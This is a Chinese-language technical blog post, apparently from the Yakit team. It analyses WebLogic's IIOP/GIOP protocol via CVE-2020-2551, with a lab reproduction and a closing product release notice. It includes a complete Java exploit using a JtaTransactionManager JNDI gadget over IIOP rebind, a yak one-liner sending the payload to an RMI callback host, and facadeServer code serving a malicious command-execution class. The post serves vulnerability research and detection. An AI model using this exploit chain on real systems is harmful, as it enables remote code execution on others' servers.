# 背景

Weblogic的7001端口默认支持T3协议和IIOP协议，本文将基于CVE-2020-2551漏洞分析weblogic的IIOP协议与其利用。

与IIOP协议相关的一些名词还有CORBA、IDL、ORB、RMI-IIOP、GIOP、stub、skeleton。简单理解，其实IIOP类似RMI。

# 名词介绍

用一些自己的理解介绍一些相关名词

## IDL

IDL全称（Interface Definition
Language）接口定义语言，它是一种与编程语言无关的接口描述语言，其它编程语言都有针对IDL的编译器，可以将IDL语言编写的文件转为其编程语言的接口或类型。保证了不同语言之间接口的统一，可以跨语言沟通。

## ORB

ORB全称（Object Request
Broker）对象请求代理。ORB代理的是服务端的对象，根据客户端的请求，调用相应对象，而客户端不需要关心对象是服务端本地的还是远程的。

## GIOP和IIOP

GIOP全称（General Inter-ORB Protocol）通用对象请求协议，IIOP全称（Internet Inter-ORB
Protocol）互联网内部对象请求代理协议，从英文名可以看出，GIOP是通用的Inter-ORB协议，规定了传输ORB数据时的规范，它针对不同的通信层有不同的具体实现，而针对于TCP/IP层，其实现名为IIOP。

ORB和IIOP关系如图

![](https://image.3001.net/images/20220921/1663736452_632a9a848828b6725c8af.gif!small)

## CORBA

CORBA全称（Common ObjectRequest Broker
Architecture）公共对象请求代理体系结构，也就是通用的ORB体系结构，IDL、ORB和IIOP是CORBA的三个关键模块。按结构可以分成三部分，客户端、服务端、注册中心，和RMI很像，不过RMI不能跨语言。其提出是为了解决不同应用程序间的通信，曾是分布式计算的主流技术。

# 漏洞复现

漏洞环境使用vulhub的`weblogic/CVE-2017-10271`，weblogic版本：10.3.6.0，利用工具使用Y4er的[CVE-2020-2551](https://github.com/Y4er/CVE-2020-2551)：https://github.com/Y4er/CVE-2020-2551

如果weblogic的主机和攻击机不在同一个网络环境下（例如Docker搭建），执行EXP可能就会出现timeout的报错，如图。

![](https://image.3001.net/images/20220921/1663736462_632a9a8ec29efc6d4bbab.png!small)

原因是第一次LocateRequest请求，返回中会有weblogic主机的ip，下一次的请求会使用weblogic主机的ip，如图，ip是docker的，所以会出现timeout

![](https://image.3001.net/images/20220921/1663736471_632a9a972d398dc913114.png!small)

## 网络问题解决

  1. 修改官方库

  2. 自己实现iiop协议

方法1简单些，只需要找到发起socket连接的位置，修改ip和端口。

先打开idea，添加异常断点，然后正常运行EXP，出现超时异常时可以看见调用栈如图

![](https://image.3001.net/images/20220921/1663736492_632a9aac251f1e3b7c0cd.png!small)

翻看调用栈,发现wlfullclient.jar!/weblogic/iiop/MuxableSocketIIOP.class#newSocket方法体只有一个语句，参数就是ip和端口，修改方便，如图

![](https://image.3001.net/images/20220921/1663736504_632a9ab800ac2a079b790.png!small)

找到了需要修改的位置，可以把MuxableSocketIIOP.class反编译修改后再重新编译放回去，也可以使用javassist修改jvm中已经加载的MuxableSocketIIOP.class。

这里使用javassist修改，代码如下

    
    
    package payload.com.payload;
    
    import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
    import com.nqzero.permit.Permit;
    
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import java.io.IOException;
    import java.lang.reflect.*;
    import java.rmi.Remote;
    import java.util.HashMap;
    import java.util.Hashtable;
    import java.util.Map;
    
    import javassist.*;
    
    public class Test {
        public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
        public static void main(String[] args) throws Exception {
            String ip = "192.168.101.211";
            String port = "7001";
            String rmiAddr = "<rmi地址>";
            hookSocket(ip,port);
            Hashtable<String, String> env = new Hashtable<String, String>();
            env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
            env.put("java.naming.provider.url", String.format("iiop://%s:%s", ip, port));
            Context context = new InitialContext(env);
            JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
            jtaTransactionManager.setUserTransactionName(rmiAddr);
            Remote remote = createMemoitizedProxy(createMap("pwned"+System.nanoTime(), jtaTransactionManager), Remote.class);
            context.rebind("hello", remote);
        }
        public static void hookSocket(String ip,String port) throws NotFoundException, CannotCompileException, IOException {
            ClassPool cp = ClassPool.getDefault();
            CtClass ctClass = cp.get("weblogic.iiop.MuxableSocketIIOP");
            String code = "return super.createSocket(java.net.InetAddress.getByName(\""+ip+"\"),"+port+", CONNECT_TIMEOUT);";
            CtMethod ctMethod = ctClass.getDeclaredMethod("newSocket");
            if(ctClass.isFrozen()){
                ctClass.defrost();
            }
            ctMethod.setBody(code);
            ctClass.toClass();
            ctClass.writeFile();
            ctClass.freeze();
        }
        public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
            return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
        }
        public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
            final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
            allIfaces[0] = iface;
            if (ifaces.length > 0) {
                System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
            }
            return iface.cast(Proxy.newProxyInstance(Main.class.getClassLoader(), allIfaces, ih));
        }
        public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
            return (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        }
        public static Constructor<?> getFirstCtor(final String name) throws Exception {
            final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
            setAccessible(ctor);
            return ctor;
        }
        public static void setAccessible(AccessibleObject member) {
            Permit.setAccessible(member);
        }
        public static Map<String, Object> createMap(final String key, final Object val) {
            final Map<String, Object> map = new HashMap<String, Object>();
            map.put(key, val);
            return map;
        }
    }

``

``

``

## 复现

打开yakit的反连服务器，监听一个端口，复制RMI反连的地址（127.0.0.1要改为本地ip）,填入上面的exp中，执行，yakit收到rmi握手请求，如图，说明存在漏洞。

![](https://image.3001.net/images/20220921/1663736614_632a9b2610637a17adecf.png!small)

# 协议分析

上述方法是通过javassist修改官方库，下面分析下EXP利用的过程，自己实现iiop协议。

打开wireshark，过滤下giop协议，看一下exp执行时的流量，如图，两次请求，第一次请求获取了key，第二次是rebind请求，这次请求发送了payload

![](https://image.3001.net/images/20220921/1663736626_632a9b326c48f5cb10da1.png!small)wireshark可以解析giop协议，如图是第二次请求

![](https://image.3001.net/images/20220921/1663736667_632a9b5b621a9f57b92b5.png!small)

主要包含一个定长的GIOP
Header和请求体，我们重点要关注的是请求体的key、operation和stub。key是第一次请求拿到的，operation是rebind_any（如果是bind请求，operation就是bind_any），stub
data就是payload了。

对比Request请求的key和LocateReply，找一下key的位置，如图，key在IOR中，但wireshark解析不了LocateReply（可能是支持协议版本太老了）

![](https://image.3001.net/images/20220921/1663736682_632a9b6a87e5cc059cf54.png!small)

key一般是\x00BEA开头，且长度为120，所以可以通过正则找出key，再通过key，构造Request请求。

# 实现GIOP协议

如果只是CVE-2020-2551的漏洞利用，只需要简单的替换下key，替换下stub
data的命令，发送Request请求就可以了，但如果是CVE-2020-14644漏洞或其它基于IIOP协议的漏洞利用，就更复杂了，每次都需要抓包，替换字符串，而且不稳定。所以不如手工实现下GIOP协议。

解析和生成GIOP协议可以参考wireshark，但解析存根、生成ServiceContextList可能就需要调试weblogic或参考文档了。

如果想解析全部GIOP协议，可以参考：https://www.omg.org/spec/CORBA/3.0.3/PDF

# yak iiop漏洞检测

上述实现的GIOP协议，已经更新到yak引擎，只需要使用如下方式，即可发送反序列化利用的rebind请求

    
    
    iiop.SendPayload("192.168.101.211:7001", iiop.RebindPayload("rmi://192.168.101.135:4434/bZRqVqxnhF530qBjsxJY"))

``

``如图，成功收到rmi请求，说明存在漏洞

![](https://image.3001.net/images/20220921/1663736785_632a9bd1923f545b0df0b.png!small)

配合facadeServer即可以实现漏洞利用。下面再介绍下facadeServer的使用，代码示例如下

    
    
    className = "test"
    s = yso.NewFacadeServer("192.168.101.211", 9090)
    execClass := yso.GenExecClass(className, "echo 1 > /tmp/1.txt")
    s.Config(
        yso.SetHttpResource(sprintf("%s.class", className), execClass),
        yso.SetLdapResourceAddr(className, sprintf("http://%s/",s.GetAddr())),
        yso.SetRmiResourceAddr(className, sprintf("http://%s/#%s", s.GetAddr(), className)),
    )
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()
    s.Serve(ctx)

Facade
server可以监听一个端口，通过Config方法，可设置对不同协议请求的响应，例如上述代码，访问`http://192.168.101.211:9090/test.class`即可下载命令执行的恶意class，请求`ldap://192.168.101.211:9090/test`就可以获得ldap利用的payload，请求`rmi://192.168.101.211:9090/test`就可以获得rmi利用的payload（ldap和rmi利用的codebase默认是`http://192.168.101.211:9090/`），如果想修改codebase可以设置`yso.SetJavaCodeBase("<class地址>"),yso.SetJavaFactory("<class名>")`

yso.GenExecClass可以动态生成一个利用静态代码块命令执行的class（会根据当前系统选择使用cmd还是bash执行命令），后续还会添加内存马、DNSLog、反弹shell、正向代理等的恶意class

## 更新上线通知

 **yaklang 引擎 v1.0.16 sp6-sp11** 1\. 修复 Web Fuzzer 在 HTTPFlow 发送失效问题；2. 新增 Yak
Bridge 的手动设置 ExternalIP 的功能；3. 修复 DNSLog 服务器硬编码导致配置失效的 BUG；4. 修复 AES GCM 的模式和
Java 表现不一致的问题；5. 修复新版本导出插件的 “ScriptName” 问题；6. 修复 Online 导入 gRPC 时进度展示不正确的
BUG； **Yakit v1.0.16 Online 上线** 1\. 线上插件商店（Beta*）上线： i. 支持 Github /
微信登陆进行插件管理 ii. 支持线上插件商店数据拉取到本地，届时 Github Yakit-Store 将会逐步退休2. Nuclei
的插件仍然需要用户自行拉取，建议所有用户在保存所有本地数据后，重新拉取数据；3. 个人插件未经审核将不会被插件商店搜索到，一定程度上避免 “投毒”
问题；4. 插件支持评论与 “反馈”：漏报和误报可以更好的在 “线上插件商店” 进行反馈。

## END

了解更多Yak相关信息，欢迎及时关注我们的官网/微信公众号；或者加入小小的技术讨论组（进讨论组请添加微信），立即获取最新的技术姿势。![](https://image.3001.net/images/20220720/1658283126_62d764763344523ba33e5.png!small)官网教程:https://www.yaklang.io/products/intro视频教程:https://space.bilibili.com/437503777下载地址:https://github.com/yaklang/yakit

